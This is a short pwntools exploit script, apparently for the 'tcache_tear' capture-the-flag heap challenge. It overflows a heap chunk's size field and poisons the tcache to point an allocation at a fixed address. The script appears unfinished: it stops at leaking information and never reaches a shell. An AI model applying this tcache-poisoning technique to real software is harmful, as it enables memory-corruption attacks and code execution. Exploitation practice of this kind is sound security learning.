from pwn import *


io = process('./tcache_tear')


def malloc(size, data):
    print(io.recvuntil('Your choice :'))
    io.sendline(b'1')
    print(io.recvuntil('Size:'))
    io.sendline(str(size))
    print(io.recvuntil('Data:'))
    io.send(data)


def free():
    print(io.recvuntil('Your choice :'))
    io.sendline(b'2')

def info():
    print(io.recvuntil('Your choice :'))
    io.sendline(b'3')

print(io.recvuntil('Name:'))
io.sendline('lmao')

payload = b'A'*(16+8)+p64(0xfffffffffffffff0)

#payload = b'A'*(16+8)+p64(0)

malloc(15, payload)


# method 1: tricking tcache

malloc(15, b'lmao')
free()
malloc(40, b'AAAABBBB')
free()

malicious = b'AAAAAAAA'*3+p64(0x91)+p64(0x602060)+b'BBBBBBBB'+b'CCCCCCCC'

pause()
malloc(15, malicious)
malloc(40, 'AAAA')
pause()
malloc(40, 'AAAA')
free()
info()
print(io.recv())
